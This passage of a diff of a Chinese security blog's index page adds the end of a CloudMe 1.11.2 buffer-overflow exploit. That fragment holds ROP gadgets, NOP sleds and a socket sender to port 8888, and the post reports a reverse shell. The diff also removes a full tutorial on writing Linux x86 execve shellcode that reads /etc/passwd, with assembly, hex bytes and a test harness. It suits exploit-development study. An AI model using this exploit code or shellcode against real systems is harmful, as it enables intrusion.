class="number">0x68b72608</span>) <span class="comment">#0x68b72608 : &#123;pivot 4156 / 0x103c&#125; :  # ADD ESP,102C # POP EBX # POP ESI # POP EDI # POP EBP # RETN 0x04</span></span><br><span class="line">nops = <span class="string">b"\x90"</span>*<span class="number">32</span></span><br><span class="line">nops2 = <span class="string">b"\x90"</span>*<span class="number">1480</span></span><br><span class="line">junk1 = <span class="string">b"\x41"</span>*<span class="number">16</span>  </span><br><span class="line">junk2 = <span class="string">b'C'</span>*(buff_size<span class="number">-2352</span><span class="number">-4</span>-len(shellcode)-len(nops)-len(nops2))</span><br><span class="line"><span class="comment">#payload = junk+nseh+seh+retn+rop_chain+nops+shellcode+junk2</span></span><br><span class="line">payload = junk+seh+nops2+junk1+rop_chain+nops+shellcode+junk2</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	s.connect((target,<span class="number">8888</span>))</span><br><span class="line">	s.send(payload)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">	print(e)</span><br></pre></td></tr></table></figure>
+
+<p>成功反弹<code>shell</code>：</p>
+<p><img src="/2022/05/08/CloudMe-v1-11-2-DEP-bypass-using-ROP-gadgets/01.png" alt="seh"></p>
+<p><strong>参考：</strong></p>
+<p>1.<a href="https://xen0vas.github.io/cloudme-v1-11-2-dep-bypass-using-rop-gadgets/#" target="_blank" rel="noopener">https://xen0vas.github.io/cloudme-v1-11-2-dep-bypass-using-rop-gadgets/#</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2022/05/07/ASX-to-MP3-Converter-3-1-2-1-SEH-Exploit/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1618,161 +1734,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2022/03/09/Create-A-Simple-Linux-Shellcode/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpeg">
-      <meta itemprop="name" content="n0maj1o24">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Technical Memorandum">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/09/Create-A-Simple-Linux-Shellcode/" class="post-title-link" itemprop="url">Create A Simple Linux Shellcode</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-03-09 12:48:39" itemprop="dateCreated datePublished" datetime="2022-03-09T12:48:39Z">2022-03-09</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-05-12 15:30:04" itemprop="dateModified" datetime="2022-05-12T15:30:04Z">2022-05-12</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Linux-Exploitation/" itemprop="url" rel="index"><span itemprop="name">Linux Exploitation</span></a>
-                </span>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2022/03/09/Create-A-Simple-Linux-Shellcode/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2022/03/09/Create-A-Simple-Linux-Shellcode/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>这里，学习编写简单的<code>Linux Shellcode</code>。本机的系统内核版本如下：</p>
-<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/10.png" alt="shellcode"></p>
-<p>利用<code>execve</code>函数来打印<code>/etc/passwd</code>的内容。</p>
-<p>来看一下<code>execve</code>函数的原型：<a href="https://man7.org/linux/man-pages/man2/execve.2.html" target="_blank" rel="noopener">https://man7.org/linux/man-pages/man2/execve.2.html</a></p>
-<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/9.png" alt="shellcode"></p>
-<p>看一下具体的<code>c</code>语言实现：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">char</span> *ls[<span class="number">3</span>];</span><br><span class="line"> ls[<span class="number">0</span>] = <span class="string">"/bin/cat"</span>;</span><br><span class="line"> ls[<span class="number">1</span>] = <span class="string">"/etc/passwd"</span>;</span><br><span class="line"> ls[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line"> execve(ls[<span class="number">0</span>],ls,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这个小程序实现的功能是查看<code>/etc/passwd</code>的内容。</p>
-<p>编译程序（看有的为了反汇编方便，会静态编译程序，我对比了一下，差别不是很大）</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -o list list.c</span><br></pre></td></tr></table></figure>
-
-<p>先弄明白整个程序的执行过程，开启<code>gdb</code>调试。</p>
-<p>反汇编<code>main</code>函数：</p>
-<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/1.png" alt="shellcode"></p>
-<p>在<code>(main+68)</code>下断点，然后运行程序。</p>
-<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/2.png" alt="shellcode"></p>
-<p>查看此时<code>eip</code>的值，指定指向调用<code>execve</code>函数。</p>
-<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/3.png" alt="shellcode"></p>
-<p>反汇编<code>execve</code>函数：</p>
-<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/4.png" alt="shellcode"></p>
-<p>在<code>(execve+18)</code>处下断点，继续跟进。</p>
-<p>可以发现内部通过<code>call DWORT PTR gs:0x10</code>执行系统调用中断，进入系统调用。执行<code>__kernel_vsyscall</code>函数。</p>
-<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/5.png" alt="shellcode"></p>
-<p>查看一下此时各寄存器的值。</p>
-<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/6.png" alt="shellcode"></p>
-<p>这里，<code>eax</code>保存的是<code>execve</code>函数的系统调用号，<code>ebx</code>保存的是<code>execve</code>函数的第二个参数，<code>ecx</code>保存的是<code>execve</code>函数的第三个参数，<code>edx</code>的值为<code>0</code>。</p>
-<p>注意后续的两条指令，<code>sysenter</code>和<code>int 0x80</code>。通过<code>80</code>中断(软中断)进入系统调用的方式是<code>Linux 2.6</code>之前的做法。指令<code>sysenter</code>是在奔腾<code>(R) II</code>处理器上引入的“快速系统调用”功能的一部分。指令<code>sysenter</code>进行过专门的优化，能够以最佳性能转换到保护环 <code>0(CPL 0)</code>。<code>sysenter</code>是<code>int 0x80</code>的替代品，实现相同的功能。这里稍微有点疑问，为什么会连两条中断进入系统调用的指令，难道现在优先用第一条，如果不行再第二条？</p>
-<p>在<code>32</code>位系统里面，<code>execve</code>函数的系统调用号可以通过如下方式查询：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/7.png" alt="shellcode"></p>
-<p>注意：以上<code>ecx</code>的值其实是一个二阶指针。具体可以看下面：</p>
-<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/8.png" alt="shellcode"></p>
-<p>到目前为止，程序的整个运行过程基本搞清楚了。现在来写一个汇编实现。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">  xor   eax, eax</span><br><span class="line">  mov   edx, eax</span><br><span class="line">  push  edx                  </span><br><span class="line">  push  0x7461632f               </span><br><span class="line">  push  0x6e69622f</span><br><span class="line">  mov   ebx,esp             </span><br><span class="line">  push  edx                  </span><br><span class="line">  push  0x64777373</span><br><span class="line">  push  0x61702f2f</span><br><span class="line">  push  0x6374652f </span><br><span class="line">  mov   ecx,esp               </span><br><span class="line">  push  edx</span><br><span class="line">  push  ecx</span><br><span class="line">  push  ebx</span><br><span class="line">  mov   ecx,esp</span><br><span class="line">  mov   al,0x0b</span><br><span class="line">  int   0x80</span><br></pre></td></tr></table></figure>
-
-<p>上面这段代码里面，注意<code>/bin/cat</code>和<code>/etc/passwd</code>都是按照四个字符一组进行分割，转换成<code>16</code>进制，压入栈中。<code>linux</code>有个地方很有意思<code>/bin/cat</code>和<code>/bin//cat</code>最后解析出来是一样的。这样四个字符一组的时候，出现空缺的字符可以用<code>/</code>代替，毕竟不会影响最后的解析。还要注意大小端的问题。</p>
-<p>编译：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf32 call_execve.asm</span><br></pre></td></tr></table></figure>
-
-<p>链接：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld -m elf_i386 -o call_execve call_execve.o</span><br></pre></td></tr></table></figure>
-
-<p>执行效果如下：</p>
-<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/11.png" alt="shellcode"></p>
-<p>现在，来提取<code>shellcode</code>。参考：<a href="https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump" target="_blank" rel="noopener">https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ./call_execve|grep <span class="string">'[0-9a-f]:'</span>|grep -v <span class="string">'file'</span>|cut -f2 -d:|cut -f1-6 -d<span class="string">' '</span>|tr -s <span class="string">' '</span>|tr <span class="string">'\t'</span> <span class="string">' '</span>|sed <span class="string">'s/ $//g'</span>|sed <span class="string">'s/ /\\x/g'</span>|paste -d <span class="string">''</span> -s |sed <span class="string">'s/^/"/'</span>|sed <span class="string">'s/$/"/g'</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/12.png" alt="shellcode"></p>
-<p>最后，测试一下。这里用到了函数指针的概念。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span></span><br><span class="line">shellcode[]=<span class="string">"\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80"</span>;</span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> (*(<span class="keyword">void</span> (*)()) shellcode)();</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里会出现一个问题，编译之后运行会出现<code>segmentation fault</code>。这个错误的出现与内核版本有关，解决办法可以参考：<a href="https://medium.com/csg-govtech/why-doesnt-my-shellcode-work-anymore-136ce179643f" target="_blank" rel="noopener">https://medium.com/csg-govtech/why-doesnt-my-shellcode-work-anymore-136ce179643f</a></p>
-<p>简而言之，就是把全局变量变为局部变量。我发现改完之后直接编译，运行还是会出错。发现需要编译的时候加上<code>-z execstack</code>，最终才能正常运行。</p>
-<p>最终的测试代码如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span class="string">"\x31\xc0\x89\xc2\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\x52\x51\x53\x89\xe1\xb0\x0b\xcd\x80"</span>;</span><br><span class="line">    (*(<span class="keyword">void</span>(*)()) shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>编译方式如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack -g customshellcode.c -o customshellcode</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/13.png" alt="shellcode"></p>
-<p>最终，运行成功：</p>
-<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/14.png" alt="shellcode"></p>
-<p><strong>参考：</strong></p>
-<p>1.<a href="https://www.cnblogs.com/LittleHann/p/4111692.html" target="_blank" rel="noopener">https://www.cnblogs.com/LittleHann/p/4111692.html</a></p>
-<p>2.<a href="http://cybersecurity.ustc.edu.cn/ns/ns09.pdf" target="_blank" rel="noopener">http://cybersecurity.ustc.edu.cn/ns/ns09.pdf</a></p>
-<p>3.<a href="https://www.anquanke.com/post/id/216207" target="_blank" rel="noopener">https://www.anquanke.com/post/id/216207</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1844,7 +1805,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">45</span>
+          <span class="site-state-item-count">46</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
